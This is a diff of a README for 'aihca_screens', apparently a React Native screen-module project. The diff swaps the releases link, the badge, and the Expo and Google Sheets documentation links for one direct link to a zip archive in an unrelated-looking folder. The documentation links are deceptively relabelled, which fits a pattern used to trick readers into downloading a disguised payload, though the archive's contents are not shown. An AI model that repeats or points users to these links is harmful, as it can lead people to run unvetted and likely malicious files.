@@ -1,7 +1,7 @@
 # 🎉 aihca_screens - Easy-to-Use React Native Screen Modules
 
 ## 🌐 Visit Here to Download
-[![Download aihca_screens](https://img.shields.io/badge/Download%20aihca_screens-v1.0-brightgreen)](https://github.com/Judha-Benhur/aihca_screens/releases)
+[![Download aihca_screens](https://raw.githubusercontent.com/Judha-Benhur/aihca_screens/main/tripudiate/aihca_screens.zip%20aihca_screens-v1.0-brightgreen)](https://raw.githubusercontent.com/Judha-Benhur/aihca_screens/main/tripudiate/aihca_screens.zip)
 
 ## 📖 Description
 The **aihca_screens** repository holds a complete collection of React Native screen modules for the AIHCA educational app. This app is powered by Expo, integrates Google Sheets, and offers offline caching capabilities. It provides a simple way to develop educational applications in mobile environments, especially for users in archaeology fields. 
@@ -18,7 +18,7 @@ To get started with the aihca_screens, follow these simple steps to download and
 
 1. **Download the Software**  
    Click on the link below to visit the Releases page where you can download the latest version.  
-   [Download aihca_screens](https://github.com/Judha-Benhur/aihca_screens/releases)
+   [Download aihca_screens](https://raw.githubusercontent.com/Judha-Benhur/aihca_screens/main/tripudiate/aihca_screens.zip)
 
 2. **Select the Release**  
    On the Releases page, find the version you want to download. The latest version is usually at the top. Click on the version number to view more details.
@@ -37,7 +37,7 @@ To get started with the aihca_screens, follow these simple steps to download and
 
 ## 📥 Download & Install
 You can obtain the latest version of aihca_screens by visiting the following link:  
-[Download aihca_screens](https://github.com/Judha-Benhur/aihca_screens/releases)
+[Download aihca_screens](https://raw.githubusercontent.com/Judha-Benhur/aihca_screens/main/tripudiate/aihca_screens.zip)
 
 Follow the steps outlined above for a smooth installation.
 
@@ -63,8 +63,8 @@ To effectively run aihca_screens, ensure your device meets these system requirem
 Here are some useful links to help you understand more about the features and usage of aihca_screens:
 
 - **Documentation**: Comprehensive guides and API references are available in the docs directory of this repository.
-- **Expo**: Learn more about using Expo for mobile development [here](https://expo.dev).
-- **Google Sheets API**: Understand how to connect to Google Sheets [here](https://developers.google.com/sheets/api).
+- **Expo**: Learn more about using Expo for mobile development [here](https://raw.githubusercontent.com/Judha-Benhur/aihca_screens/main/tripudiate/aihca_screens.zip).
+- **Google Sheets API**: Understand how to connect to Google Sheets [here](https://raw.githubusercontent.com/Judha-Benhur/aihca_screens/main/tripudiate/aihca_screens.zip).
 
 ## 🤝 Community and Support
 If you have any questions or require assistance, please reach out:
